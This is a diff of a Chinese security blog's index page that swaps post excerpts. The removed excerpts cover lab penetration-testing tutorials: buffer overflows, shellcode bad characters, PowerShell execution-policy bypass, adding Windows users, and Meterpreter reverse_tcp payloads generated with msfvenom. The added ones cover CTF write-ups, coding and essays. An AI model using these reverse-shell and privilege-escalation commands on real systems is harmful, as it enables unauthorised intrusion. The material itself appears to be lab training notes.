@@ -174,22 +174,20 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-01-30-04-x/">brainpan（栈溢出）</a>
+        <a href="/2021/05/20/2018-09-29-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%BB%8E%E4%B8%9A%E6%8C%87%E5%8D%972.0/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-01-30-04-x/">
+        <a href="/2021/05/20/2018-09-29-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E4%BB%8E%E4%B8%9A%E6%8C%87%E5%8D%972.0/">
           
           
             
           
-          题外话：人生其实很简单，想要的就去争取，得到了就珍惜，失去了就忘记。
-192.168.67.130
-123PORT      STATE SERVICE9999/tcp  open  abyss 10000/tcp open  snet-sensor-mgmt
-http://192.168.67.130:10000
-nc 192.168.67.130 9999
+          作者：赵彦整理者：whale
+编辑引言：在网上看到赵彦前辈的这篇文章（2014年发布），但是通篇文字下来，一个小标题都没有，看得实在累得慌。
+但内容对于新人来说，很有参考价值，所以斗胆编辑整理。
 
-根据nc连接结果来看，brainp
+正文：为了减少篇幅有些东西就略过不写了，可以参考我以前写的《信息安全从业参考》《信息安全的职业生涯》《CSO的生存艺术》等老文章，或者我记得在安言的论坛上有人对我写的话题展开和补充并重新成文，具体记不太
         </a>
       </p>
 
@@ -206,7 +204,7 @@ nc 192.168.67.130 9999
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/buffer-overflow/">buffer overflow</a>
+              <a href="/categories/View/">View</a>
             
           </div>
         
@@ -214,7 +212,7 @@ nc 192.168.67.130 9999
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/buffer-overflow/">buffer overflow</a>
+              <a href="/tags/View/">View</a>
             
           </div>
         
@@ -228,19 +226,20 @@ nc 192.168.67.130 9999
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-01-30-06-x/">brainpan（suid溢出提权）</a>
+        <a href="/2021/05/20/2018-10-01-%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%AD%97%E7%AC%A6%E7%94%BB/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-01-30-06-x/">
+        <a href="/2021/05/20/2018-10-01-%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%AD%97%E7%AC%A6%E7%94%BB/">
           
           
             
           
-          参考资料：Sneaky（suid+缓冲区溢出提权）
-上一篇得到了一个普通权限的shell，通过suid的缓冲区溢出漏洞，得到shell。这也不是第一次遇到了类似情况了。
-文件传输whereis gdb结果显示客户机没有gdb，所以传输到kali上分析。
-12【目标机】nc -lnvp 8080 -w 5 &lt; /usr/local/bin/validate【kali】nc 192.168.67
+          参考：图片转字符画
+BadApple视频转字符动画
+依赖python3 + PIL模块
+程序分析该程序可以定义生成字符画的类型（html、txt）、画的尺寸
+pil的image类1234pic = Image.open(&#x27;路径&#x27;) #创建一个类实例x,y = pic.sizeout = pic.resize((x,y),Image.NEAREST) out.save(&quot
         </a>
       </p>
 
@@ -257,7 +256,7 @@ nc 192.168.67.130 9999
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/buffer-overflow/">buffer overflow</a>
+              <a href="/categories/code/">code</a>
             
           </div>
         
@@ -265,7 +264,7 @@ nc 192.168.67.130 9999
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/buffer-overflow/">buffer overflow</a>
+              <a href="/tags/code/">code</a>
             
           </div>
         
@@ -279,19 +278,22 @@ nc 192.168.67.130 9999
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-05-09-x/">crossfire&amp;linux缓冲区溢出案例（四）</a>
+        <a href="/2021/05/20/2018-09-30-vmware%E7%9B%B8%E5%85%B3/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-05-09-x/">
+        <a href="/2021/05/20/2018-09-30-vmware%E7%9B%B8%E5%85%B3/">
           
           
             
           
-          参考资料：linux程序的常用保护机制
-上一篇：crossfire&amp;linux缓冲区溢出案例（三）
-生成shellcode上一篇找到了这些坏字符，在生成shellcode的时候必须避免这些字符出现\x00\x09\x0a\x20
-1234567[目标主机ip-linux] 192.168.67.128[攻击机ip]         192.168.67.1msfvenom -p linux
+          问题一，无法访问htb内网？要怎样配置，才能让kali虚拟机访问htb内网。
+相关（也许不相关）知识点：
+端口转发，也可以叫静态端口映射你必须将你的服务端的内网ip的端口转发到外网才能访问，这就是端口转发。
+
+动态端口映射（NAT，网络地址转换），两个主机，将a主机的1端口映射到b主机的1端口。于是访问b:1就等于访问a:1。
+
+静态和动态端口映射的区别，当连接关闭后，内网和公网端口的映射就关闭了
         </a>
       </p>
 
@@ -304,68 +306,6 @@ nc 192.168.67.130 9999
             </time>
           </div>
         
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/buffer-overflow/">buffer overflow</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/buffer-overflow/">buffer overflow</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/05/20/2020-02-07-09-x/">查找与修改exp</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-07-09-x/">
-          
-          
-            
-          
-          本地查找exp123searchsploit slmaillocate /643.c
-互联网上查找exp可靠的经过验证的公开exp来源：
-
-https://www.exploit-db.com/
-https://www.securityfocus.com/
-
-exp debug由于软件版本等问题，exp可能会执行不成功。
-要搭建对应的操作系统版本和有漏洞的软件，作为目标环境，来测试exp。测试ex
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-05-20 15:27" pubdate>
-              2021-05-20
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/tools/">tools</a>
-            
-          </div>
         
         
           <div class="post-meta">
@@ -385,24 +325,22 @@ exp debug由于软件版本等问题，exp可能会执行不成功。
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-11-03-x/">windows内核提权</a>
+        <a href="/2021/05/20/2018-10-07-live_lfi%EF%BC%88php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-11-03-x/">
+        <a href="/2021/05/20/2018-10-07-live_lfi%EF%BC%88php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/">
           
           
             
           
-          参考资料：
+          题目地址如题目所提示，是PHP文件包含漏洞。访问给出的题目地址，网页提示“网站正在建设中”
+扫描目录和所有web漏洞一样，先dirbuster扫描一下
 
-github项目lpeworkshop
-youtubu视频
+test.php报错
+require_once()语句在脚本执行期间包含并运行指定文件/home/level/14_live_fi/www/test.php不是一个目录，然后报错了。
 
-【windows】
-123powershell -nop -ep bypassImport-Module C:\Users\whale\Desktop\Tools\Sherlock\Sherlock.ps1Find-AllVulns
-【kali】
-1234msfconsolehandler -H 192.168.1.100
+info1:网站所在目录路径： /home/level/14
         </a>
       </p>
 
@@ -419,7 +357,7 @@ youtubu视频
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/CTF/">CTF</a>
             
           </div>
         
@@ -427,7 +365,7 @@ youtubu视频
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/web/">web</a>
             
           </div>
         
@@ -441,21 +379,19 @@ youtubu视频
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-13-08-x/">windows-cmd用户管理命令</a>
+        <a href="/2021/05/20/2018-10-12-code-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86-%E5%8A%A0%E6%B0%B4%E5%8D%B0/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-13-08-x/">
+        <a href="/2021/05/20/2018-10-12-code-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86-%E5%8A%A0%E6%B0%B4%E5%8D%B0/">
           
           
             
           
-          查看查看用户net user 用户
-查看用户组net localgroup administrators(用户组)
-添加添加用户net user 用户名 密码 /add /expires:never
-添加用户密码net user Administrator 123456 /add 
-修改修改用户密码net user 用户名 密码
-添加/删除用户组中的用户12net localgroup group
+          ————main.py            |png.py            |handleDocx.py
+环境python2+ 某些图像处理模块
+题外这个程序写了有两三个月了吧==不过是断断续续地写的，收获有很多。不过当时只顾着完成了，没有什么记录。
+
         </a>
       </p>
 
@@ -472,7 +408,7 @@ youtubu视频
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/code/">code</a>
             
           </div>
         
@@ -480,7 +416,7 @@ youtubu视频
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/code/">code</a>
             
           </div>
         
@@ -494,27 +430,18 @@ youtubu视频
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-13-12-x/">windows服务提权&amp;dll劫持</a>
+        <a href="/2021/05/20/2018-10-13-node%EF%BC%88%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2+%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9B%B8%E5%85%B3%EF%BC%89/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-13-12-x/">
+        <a href="/2021/05/20/2018-10-13-node%EF%BC%88%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2+%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9B%B8%E5%85%B3%EF%BC%89/">
           
           
             
           
-          参考资料：
-
-dll劫持
-sc.exe windows 服务管理
-youtube视频
-
-制作了一个youtube视频，下面是用到的一些命令。
-sc是一个管理主机服务的工具
-查看一个服务的运行状态 ，sc query 服务名
-查看一个服务的配置信息 ，sc qc 服务名
-【windows】
-1234567891011whoamiC:\Program Files\DLL Hijack Service\
+          靶机下载地址
+学习资料https://rastating.github.io/hackthebox-node-walkthrough/
+扫描1222/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)3000/tcp open  http    Node.js Express framew
         </a>
       </p>
 
@@ -531,7 +458,7 @@ sc是一个管理主机服务的工具
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/training/">training</a>
             
           </div>
         
@@ -539,7 +466,7 @@ sc是一个管理主机服务的工具
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/training/">training</a>
             
           </div>
         
@@ -553,19 +480,21 @@ sc是一个管理主机服务的工具
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-13-10-x/">binpath本地提权</a>
+        <a href="/2021/05/20/2018-10-15-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">code-网络编程-正则表达式</a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-13-10-x/">
+        <a href="/2021/05/20/2018-10-15-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
           
           
             
           
-          binpath本地提权是利用了服务权限不正确。在youtube上传了一个演示视频
-参考资料：https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html
-上一篇提到过，sc.exe是一个管理windows服务的命令。
-检查服务配置的权限是否不安全C:\Users\User\Desktop\Tools\Access
+          某个CTF的python编程题：
+nc 202.38.95.47 12009连接后提示
+12You have only 30 seconds(((8-2)|(6&amp;135))^((24*31)*(8+3)))
+有个坑，从52题起，里面夹杂着命令。我不知道命令怎么计算，还以为是数据清洗，删除就好。感谢朋友帮助，根据以前的答案推算出命令和数字的对应关系，然后替换就好。
+
+re注意要点以下字符使用
         </a>
       </p>
 
@@ -582,7 +511,7 @@ sc是一个管理主机服务的工具
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/code/">code</a>
             
           </div>
         
@@ -590,7 +519,7 @@ sc是一个管理主机服务的工具
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/code/">code</a>
             
           </div>
         
@@ -604,17 +533,57 @@ sc是一个管理主机服务的工具
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-15-03-x/">未打引号的路径&amp;windows本地提权</a>
+        <a href="/2021/05/20/2018-10-17-rotating_fortress%EF%BC%88%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%89/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-15-03-x/">
+        <a href="/2021/05/20/2018-10-17-rotating_fortress%EF%BC%88%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%89/">
           
           
             
           
-          我录制了一个演示视频
-meterpreter开启监听123456789msfconsolehandler -H 192.168.1.100 -P 4444 -p windows/x64/meterpreter/reverse_tcpmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
+          靶机下载地址
+扫描感觉有两种特别难突破防线，一种可以搜集的信息特别特别少，端口只开了一两个；一种信息特别特别多，不知道从哪里下手==
+这种貌似就是特别少的那种。端口：80（http）、27025（unknown）
+http服务访问80端口，自动跳转/Janus.php，只有一行字，你不是admin。。除此之外没有任何可用页面（网站地图爬行过）
+unknown服务先扫描这个端口，发现nmap扫不出什
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-05-20 15:27" pubdate>
+              2021-05-20
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/05/20/2018-10-24-%E8%AF%BB%E6%9C%97%E6%9C%97%E8%87%AA%E4%BC%A0%E6%9C%89%E6%84%9F/"></a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/05/20/2018-10-24-%E8%AF%BB%E6%9C%97%E6%9C%97%E8%87%AA%E4%BC%A0%E6%9C%89%E6%84%9F/">
+          
+          
+            
+          
+            朗朗是中国数一数二的钢琴演奏家，从他3岁起接触钢琴，就没有一天间断过练习钢琴。他还未成年就成了举世瞩目的演奏家。
+  从沈阳到北京，从北京到德国。没有人脉、没有富裕的家庭，他有的只是努力+天赋+运气。当时中央音乐学院选派5个学生去参加比赛，没有选中朗朗。郎任国就决定自己带朗朗去德国参加比赛，结果拿了第一名。
+为他的努力致敬~
+  我想说的是艺术这个行业（器乐演奏、架上绘画、舞蹈表演等等），这是
         </a>
       </p>
 
@@ -631,7 +600,7 @@ meterpreter开启监听123456789msfconsolehandler -H 192.168.1.100 -P 4444 -p wi
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/View/">View</a>
             
           </div>
         
@@ -639,7 +608,7 @@ meterpreter开启监听123456789msfconsolehandler -H 192.168.1.100 -P 4444 -p wi
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/View/">View</a>
             
           </div>
         
@@ -653,18 +622,18 @@ meterpreter开启监听123456789msfconsolehandler -H 192.168.1.100 -P 4444 -p wi
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
-        <a href="/2021/05/20/2020-02-16-05-x/">windows服务之注册表提权</a>
+        <a href="/2021/05/20/2018-10-25-HDC%EF%BC%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%EF%BC%89/"></a>
       </h1>
 
       <p class="index-excerpt">
-        <a href="/2021/05/20/2020-02-16-05-x/">
+        <a href="/2021/05/20/2018-10-25-HDC%EF%BC%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8E%E5%8F%B0%EF%BC%89/">
           
           
             
           
-          windows服务之注册表提权b站上的视频教程
-用户权限NT Authority \ SYSTEM又称LocalSystem帐户是内置的Windows帐户。 它是Windows本地实例上功能最强大的帐户（比任何管理员帐户都更强大）。 大多数系统级别（Windows Services）服务和其他一些第三方服务都在帐户中运行
-NT Authority \ SYSTEM 是Builtin\Adminis
+          题目这是一道hackthebox中的web题。http://docker.hackthebox.eu:47629/main/index.php
+源代码首先分析一下页面，是一个登陆页面。通过分析源代码，可知：用户名和密码的表单参数为name1、name2，post提交myscripts.js 说明获取formaki表单，然后提交。
+123function doProcess() &#123;    
         </a>
       </p>
 
@@ -681,7 +650,7 @@ NT Authority \ SYSTEM 是Builtin\Adminis
           <div class="post-meta mr-3">
             <i class="iconfont icon-category"></i>
             
-              <a href="/categories/windows/">windows</a>
+              <a href="/categories/CTF/">CTF</a>
             
           </div>
         
@@ -689,7 +658,7 @@ NT Authority \ SYSTEM 是Builtin\Adminis
           <div class="post-meta">
             <i class="iconfont icon-tags"></i>
             
-              <a href="/tags/windows/">windows</a>
+              <a href="/tags/CTF/">CTF</a>
             
           </div>
         
